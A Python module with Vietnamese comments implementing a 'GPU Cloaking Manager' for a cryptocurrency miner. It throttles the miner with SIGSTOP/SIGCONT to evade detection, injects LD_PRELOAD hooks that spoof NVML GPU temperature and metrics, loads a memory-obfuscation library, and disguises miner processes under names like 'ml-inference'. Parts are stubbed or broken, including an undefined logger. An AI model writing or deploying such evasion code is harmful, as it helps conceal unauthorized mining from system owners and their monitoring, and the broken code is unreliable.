# -*- coding: utf-8 -*-
"""
GPU Cloaking Manager – triển khai Time-based Evasion & eBPF Telemetry Filter cho các kỹ thuật GPU cloaking.

Ý tưởng chính:
    • Duy trì vòng lặp WORK_MS / SLEEP_MS để bật/tạm dừng tiến trình khai thác GPU.
    • Sử dụng tín hiệu SIGCONT / SIGSTOP lên PID của miner để tránh thao tác driver phức tạp.
    • Tích hợp eBPF Telemetry Filter để chặn GPU monitoring ở kernel space.
    • Cho phép tuỳ chỉnh thông số qua biến môi trường hoặc tệp cấu hình.
    • Chuẩn bị sẵn hook chạy kernel Memory Pattern Obfuscation (nếu **ENABLE_MPO=1**).

Cách dùng
---------
Trong start_mining.py:
    gpu_process = start_mining_process(...)
    from mining_environment.scripts.gpu_cloaking_manager import GPUCloakingManager
    cloaker = GPUCloakingManager(gpu_process.pid)
    cloaker.start()

Biến môi trường
---------------
• WORK_MS  (mặc định 800)   – thời gian burst tính bằng ms.
• SLEEP_MS (mặc định 200)   – thời gian ngủ.
• ENABLE_MPO (0/1)          – chạy kernel Memory Pattern Obfuscation song song.
• ENABLE_EBPF_CLOAK (0/1)   – bật eBPF Telemetry Filter.
• EBPF_CONFIG_PATH          – đường dẫn file cấu hình eBPF.
"""

import os
import signal
import threading
import time
import logging
import subprocess
from pathlib import Path
from typing import Optional, Dict, Any, List

# ✅ LAYER 1: Import IGPUPlugin and IGPUCloakService interfaces
try:
    from ..core.interfaces import IGPUPlugin, IGPUCloakService
except ImportError:
    # Fallback nếu không có interface
    class IGPUPlugin:
        pass
    class IGPUCloakService(IGPUPlugin):
        pass

try:
    import ctypes
except ImportError:
    ctypes = None  # một số môi trường không cần MPO

# eBPF support removed - module deleted
EBPF_AVAILABLE = False
EBPFTelemetryFilter = None

# ---- helper log JSON - telemetry module removed ----
def log_gpu_feature(*_args, **_kwargs):  # type: ignore
    """Telemetry logging functionality has been removed"""
    pass

# Import Timing logger (đúng mapping cho time_based_manager)  
try:
    from ...scripts.module_loggers import get_timing_logger
    logger = get_timing_logger()
except ImportError:
    # Fallback nếu không có logger
    import logging
    logger = logging.getLogger(__name__)

# ---------- logging ----------
LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
os.makedirs(LOGS_DIR, exist_ok=True)

logging.basicConfig(
    level=os.getenv('GPU_CLOAK_LOG_LEVEL', 'INFO'),
    format='%(asctime)s [%(levelname)s] GPUCloak: %(message)s',
    handlers=[
        logging.FileHandler(Path(LOGS_DIR) / 'gpu_cloaking_manager.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('gpu_cloaking_manager')

# ---------- helper class ----------
class GPUCloakingManager(IGPUCloakService):
    """Điều phối Time-based Evasion và eBPF Telemetry Filter cho một process GPU miner.
    
    ✅ LAYER 1: Implements IGPUPlugin interface for proper plugin registration.
    """

    def __init__(self, target_pid: int, work_ms: Optional[int] = None, sleep_ms: Optional[int] = None, 
                 stop_event: Optional[threading.Event] = None, ebpf_config_path: Optional[str] = None):
        self.pid = target_pid
        self.work_ms = int(os.getenv('WORK_MS', work_ms or 800))
        self.sleep_ms = int(os.getenv('SLEEP_MS', sleep_ms or 200))
        self.stop_event = stop_event or threading.Event()
        
        # Threading components
        self._thread: Optional[threading.Thread] = None
        self.mpo_thread: Optional[threading.Thread] = None
        
        # eBPF Telemetry Filter - REMOVED
        self.ebpf_filter = None
        self.ebpf_config_path = None
        self.ebpf_enabled = False
        
        # Cloaking strategies status
        self.strategies_status = {
            'time_based_evasion': False,
            'memory_pattern_obfuscation': False,
            'ebpf_telemetry_filter': False,
            'nvml_interception': False
        }
        
        # Khởi tạo biến môi trường cho NVML interception
        self._initialize_nvml_interception()

    # ========== 🔧 LAYER 1: IGPUPlugin Interface Implementation ==========
    @property 
    def name(self) -> str:
        """Tên của plugin"""
        return "time_based_manager"
    
    def initialize(self, config: Dict[str, Any]) -> bool:
        """Khởi tạo plugin với cấu hình
        
        Args:
            config: Dictionary chứa cấu hình plugin
            
        Returns:
            bool: True nếu khởi tạo thành công
        """
        try:
            # Update configuration từ config dict
            self.work_ms = config.get('work_ms', self.work_ms)
            self.sleep_ms = config.get('sleep_ms', self.sleep_ms)
            
            # Initialize NVML interception với config
            nvml_success = self._initialize_nvml_interception()
            
            logger.info(f"✅ [LAYER1] time_based_manager initialized: work_ms={self.work_ms}, sleep_ms={self.sleep_ms}, nvml={nvml_success}")
            return True
            
        except Exception as e:
            logger.error(f"❌ [LAYER1] time_based_manager initialization failed: {e}")
            return False

    # ========== End IGPUPlugin Interface Implementation ==========

    # ---------------- NVML Interception -----------------
    def _initialize_nvml_interception(self) -> bool:
        """
        Khởi tạo cơ chế chặn NVML API để giả lập các giá trị GPU.
        
        Xử lý các vấn đề phổ biến với tempspoof và các hook NVML khác.
        """
        enable_temp_spoof = os.getenv('ENABLE_TEMP_SPOOF', '0') == '1'
        enable_nvml_hijack = os.getenv('ENABLE_NVML_IPC_HIJACKING', '0') == '1'
        
        if not (enable_temp_spoof or enable_nvml_hijack):
            logger.debug("Chế độ NVML interception bị tắt")
            return False
            
        try:
            # Kiểm tra LD_PRELOAD có chứa các thư viện cần thiết không
            ld_preload = os.environ.get('LD_PRELOAD', '')
            hooks = []
            
            if enable_temp_spoof and '/opt/hooks/libtempspoof.so' not in ld_preload:
                hooks.append('/opt/hooks/libtempspoof.so')
                
            if enable_nvml_hijack and '/opt/hooks/libgpuhook.so' not in ld_preload:
                hooks.append('/opt/hooks/libgpuhook.so')
                
            # Thêm hooks vào LD_PRELOAD nếu cần
            if hooks:
                if ld_preload:
                    os.environ['LD_PRELOAD'] = ld_preload + ':' + ':'.join(hooks)
                else:
                    os.environ['LD_PRELOAD'] = ':'.join(hooks)
                logger.info(f"Đã thêm {len(hooks)} hook NVML vào LD_PRELOAD")
            
            # Kiểm tra xem libtempspoof có thể tìm thấy hàm gốc không
            if enable_temp_spoof:
                # Thử thiết lập symbol linking trước
                try:
                    # Tải libnvidia-ml.so với các đường dẫn phổ biến
                    nvml_lib_paths = [
                        '/usr/lib/x86_64-linux-gnu/libnvidia-ml.so.1',
                        '/usr/lib/libnvidia-ml.so.1',
                        '/usr/local/cuda/lib64/libnvidia-ml.so.1'
                    ]
                    
                    for lib_path in nvml_lib_paths:
                        if os.path.exists(lib_path):
                            if ctypes:
                                try:
                                    nvml_lib = ctypes.CDLL(lib_path)
                                    logger.info(f"✅ Đã tải NVML library từ {lib_path}")
                                    break
                                except Exception as e:
                                    logger.debug(f"Không thể tải {lib_path}: {e}")
                except Exception as e:
                    logger.warning(f"Không thể khởi tạo NVML symbols: {e}")
                
            # Đánh dấu chiến lược là đã kích hoạt
            self.strategies_status['nvml_interception'] = True

            # --- JSON log ---
            log_gpu_feature(
                feature="gpu_cloaking",
                state="enabled",
                parameters={"nvml_interception": True},
                message="Khởi tạo NVML interception thành công",
            )
            return True
                
        except Exception as e:
            logger.error(f"❌ Lỗi khi khởi tạo NVML interception: {e}")
            log_gpu_feature(
                feature="gpu_cloaking",
                state="error",
                parameters={"nvml_interception": False},
                error_code="IPC_ERR",
                message=str(e),
            )
            return False

    # ---------------- eBPF Telemetry Filter -----------------
    def _initialize_ebpf_filter(self) -> bool:
        """eBPF Telemetry Filter đã được loại bỏ khỏi ứng dụng."""
        logger.info("ℹ️ eBPF functionality has been completely removed from this application")
        return True
    
    def _stop_ebpf_filter(self):
        """eBPF Telemetry Filter đã được loại bỏ khỏi ứng dụng."""
        logger.info("ℹ️ eBPF functionality has been completely removed from this application")
        return

    # ---------------- MPO (memory pattern obfuscation) -----------------
    def _run_memory_obfuscation(self):
        """Tải .so dummy kernel nếu ENABLE_MPO=1 và thư viện tồn tại."""
        logger.debug("Bắt đầu quá trình nạp thư viện MPO...")
        if ctypes is None:
            logger.warning("Thư viện ctypes không khả dụng, không thể nạp MPO. Bỏ qua.")
            return

        lib_path = os.getenv('MPO_LIB', '/opt/mpo/libmpo.so')
        logger.info(f"Đang kiểm tra thư viện MPO tại đường dẫn: {lib_path}")

        if not Path(lib_path).is_file():
            logger.error(f"LỖI: Không tìm thấy thư viện MPO tại {lib_path}. Không thể nạp.")
            return
        
        logger.info(f"Thư viện MPO tồn tại. Đang tiến hành nạp bằng ctypes...")
        try:
            lib = ctypes.CDLL(lib_path)
            logger.info(f"✅ Nạp thành công thư viện MPO từ {lib_path}")
            
            if hasattr(lib, 'launch_mpo_kernel'):
                logger.info("Hàm 'launch_mpo_kernel' tồn tại. Đang chuẩn bị khởi chạy kernel...")
                lib.launch_mpo_kernel.restype = None
                lib.launch_mpo_kernel()
                self.strategies_status['memory_pattern_obfuscation'] = True
                logger.info("✅ Kernel MPO đã được khởi chạy thành công.")
            else:
                logger.error("LỖI: Thư viện MPO đã được nạp nhưng không tìm thấy hàm 'launch_mpo_kernel'.")
        except Exception as exc:
            logger.error(f"LỖI NGHIÊM TRỌNG khi đang nạp hoặc thực thi MPO từ {lib_path}: {exc}", exc_info=True)

    # ---------------- Main duty-cycle loop -----------------
    def _duty_cycle_loop(self):
        logger.info(
            "🚀 Bắt đầu GPU Cloaking: WORK_MS=%d, SLEEP_MS=%d, PID=%d",
            self.work_ms, self.sleep_ms, self.pid
        )
        
        # eBPF filter has been removed - skipping initialization
        logger.info("ℹ️ eBPF filter has been removed from this application")
        
        # Initialize MPO if enabled
        enable_mpo = os.getenv('ENABLE_MPO', '0') == '1'
        if enable_mpo:
            self.mpo_thread = threading.Thread(target=self._run_memory_obfuscation, daemon=True)
            self.mpo_thread.start()

        work_sec = self.work_ms / 1000.0
        sleep_sec = self.sleep_ms / 1000.0
        
        # Mark time-based evasion as active
        self.strategies_status['time_based_evasion'] = True
        
        # Log active strategies
        active_strategies = [k for k, v in self.strategies_status.items() if v]
        logger.info("🎭 Các chiến lược cloaking đang hoạt động: %s", ', '.join(active_strategies))

        # ✅ Check if target PID is mining process - skip time-based evasion
        is_mining_process = False
        try:
            with open(f"/proc/{self.pid}/cmdline", 'r') as f:
                cmdline = f.read()
            
            # Skip time-based evasion for mining processes
            if "inference-cuda" in cmdline or "ml-inference" in cmdline:
                is_mining_process = True
                logger.info(f"🎮 [MINING-EXCLUSION] Detected mining process PID {self.pid} - skipping time-based evasion")
                logger.info(f"🎮 [MINING-EXCLUSION] Command line: {cmdline.strip()}")
                
                # Keep other cloaking strategies active but skip SIGSTOP/SIGCONT cycling
                while not self.stop_event.is_set():
                    time.sleep(30)  # Just monitor, don't interfere with mining
                    
                logger.info(f"🎮 [MINING-EXCLUSION] Mining process monitoring ended for PID {self.pid}")
                return
        except (OSError, IOError):
            logger.debug(f"Could not read cmdline for PID {self.pid} - proceeding with normal time-based evasion")

        while not self.stop_event.is_set():
            # Resume process
            try:
                os.kill(self.pid, signal.SIGCONT)
            except ProcessLookupError:
                logger.error("Process %d không tồn tại. Dừng cloaker.", self.pid)
                self.stop_event.set(); break
            time.sleep(work_sec)

            # Pause process
            try:
                os.kill(self.pid, signal.SIGSTOP)
            except ProcessLookupError:
                logger.error("Process %d không tồn tại. Dừng cloaker.", self.pid)
                self.stop_event.set(); break
            time.sleep(sleep_sec)

        # Cleanup on exit
        self.strategies_status['time_based_evasion'] = False
        
        # ensure miner resumed on exit
        try:
            os.kill(self.pid, signal.SIGCONT)
        except ProcessLookupError:
            pass
            
        logger.info("🛑 GPUCloakingManager duty cycle dừng.")

    # ---------------- public API -----------------
    def start(self) -> bool:
        """Khởi động GPU Cloaking Manager với tất cả các chiến lược.
        
        Returns:
            bool: True nếu khởi động thành công, False nếu thất bại
        """
        try:
            if self._thread and self._thread.is_alive():
                logger.warning("GPUCloakingManager đã chạy từ trước.")
                gpu_cloak_logger.log_time_based_evasion(
                    action="START",
                    status="SUCCESS",
                    target_pid=self.pid,
                    error_details="Already running"
                )
                return True  # ✅ Already running counts as success
            
            # ✅ Validate target PID before starting
            if not self.is_process_alive():
                logger.error(f"❌ Target PID {self.pid} is not alive - cannot start time_based_manager")
                gpu_cloak_logger.log_time_based_evasion(
                    action="START",
                    status="FAILED",
                    target_pid=self.pid,
                    error_details=f"Target PID {self.pid} not alive"
                )
                return False
            
            logger.info("🚀 Khởi động GPUCloakingManager cho PID %d", self.pid)
            gpu_cloak_logger.log_time_based_evasion(
                action="START",
                status="SUCCESS",
                work_ms=self.work_ms,
                sleep_ms=self.sleep_ms,
                target_pid=self.pid
            )
            
            # ✅ Start the duty cycle thread
            self._thread = threading.Thread(target=self._duty_cycle_loop, daemon=True)
            self._thread.start()
            
            # ✅ Brief wait to ensure thread started successfully
            import time
            time.sleep(0.1)
            
            if self._thread and self._thread.is_alive():
                logger.info(f"✅ time_based_manager started successfully for PID {self.pid}")
                return True
            else:
                logger.error(f"❌ time_based_manager thread failed to start for PID {self.pid}")
                return False
                
        except Exception as e:
            logger.error(f"❌ Exception starting time_based_manager for PID {self.pid}: {e}")
            gpu_cloak_logger.log_time_based_evasion(
                action="START",
                status="FAILED",
                target_pid=self.pid,
                error_details=str(e)
            )
            return False

    def stop(self):
        """Dừng tất cả các chiến lược cloaking."""
        logger.info("🛑 Đang dừng GPUCloakingManager...")
        
        # Signal stop to main thread
        self.stop_event.set()
        
        # Wait for main thread to finish
        if self._thread:
            self._thread.join(timeout=5)
        
        # eBPF filter has been removed - no cleanup needed
        
        # MPO thread will stop automatically (daemon thread)
        if self.mpo_thread and self.mpo_thread.is_alive():
            logger.info("🛑 MPO thread sẽ dừng tự động")
        
        logger.info("✅ GPUCloakingManager đã được dừng hoàn toàn.")
    
    def get_status(self) -> Dict[str, Any]:
        """Lấy trạng thái hiện tại của các chiến lược cloaking."""
        status = {
            'pid': self.pid,
            'running': self._thread.is_alive() if self._thread else False,
            'strategies': self.strategies_status.copy(),
            'config': {
                'work_ms': self.work_ms,
                'sleep_ms': self.sleep_ms,
                'ebpf_enabled': self.ebpf_enabled,
                'ebpf_config_path': self.ebpf_config_path
            }
        }
        
        # eBPF filter has been removed
        status['ebpf_status'] = 'removed'
        
        return status
    
    def update_fake_metrics(self, metrics: Dict[str, int]) -> None:
        """Cập nhật fake metrics cho các cloaking strategies.
        
        Args:
            metrics: Dictionary chứa các metric và giá trị fake
        """
        logger.info("ℹ️ eBPF filter has been removed - cannot update metrics")
        logger.debug(f"Would update fake metrics: {metrics}")
    
    def enable_cloaking(self, strategies: List[str]) -> bool:
        """Kích hoạt các chiến lược cloaking.
        
        Args:
            strategies: Danh sách tên các chiến lược cloaking
            
        Returns:
            bool: True nếu kích hoạt thành công
        """
        try:
            success_count = 0
            available_strategies = list(self.strategies_status.keys())
            
            for strategy in strategies:
                if strategy in available_strategies:
                    # Enable strategy based on type
                    if strategy == 'time_based_evasion':
                        if not self._thread or not self._thread.is_alive():
                            success = self.start()
                            if success:
                                self.strategies_status[strategy] = True
                                success_count += 1
                        else:
                            self.strategies_status[strategy] = True
                            success_count += 1
                    else:
                        # For other strategies, mark as enabled if conditions are met
                        self.strategies_status[strategy] = True
                        success_count += 1
                    
                    logger.info(f"✅ Enabled cloaking strategy: {strategy}")
                else:
                    logger.warning(f"⚠️ Unknown cloaking strategy: {strategy}")
            
            logger.info(f"🎭 Enabled {success_count}/{len(strategies)} cloaking strategies")
            return success_count > 0
            
        except Exception as e:
            logger.error(f"❌ Failed to enable cloaking strategies: {e}")
            return False
    
    def disable_cloaking(self) -> bool:
        """Tắt tất cả chiến lược cloaking.
        
        Returns:
            bool: True nếu tắt thành công
        """
        try:
            # Stop time-based evasion
            if self._thread and self._thread.is_alive():
                self.stop()
            
            # Mark all strategies as disabled
            for strategy in self.strategies_status:
                self.strategies_status[strategy] = False
            
            logger.info("🛑 All cloaking strategies disabled")
            return True
            
        except Exception as e:
            logger.error(f"❌ Failed to disable cloaking: {e}")
            return False
    
    def get_active_strategies(self) -> List[str]:
        """Lấy danh sách các chiến lược đang active.
        
        Returns:
            List[str]: Danh sách tên chiến lược active
        """
        return [strategy for strategy, active in self.strategies_status.items() if active]
    
    def is_process_alive(self) -> bool:
        """Kiểm tra xem target process còn sống không."""
        try:
            os.kill(self.pid, 0)  # Signal 0 để kiểm tra process existence
            return True
        except ProcessLookupError:
            return False
        except PermissionError:
            return True  # Process exists but we don't have permission 
# ✅ FIX: Export TimeBasedManager class alias
TimeBasedManager = GPUCloakingManager

# ✅ FIX: Add missing log_gpu_cloaking function at module level
def log_gpu_cloaking(*args, **kwargs):
    """Module-level log_gpu_cloaking function"""
    logger.info("[GPU_CLOAKING] " + " ".join(map(str, args)))

print("✅ [TIME_BASED_MANAGER_FIX] Added TimeBasedManager alias and log_gpu_cloaking")
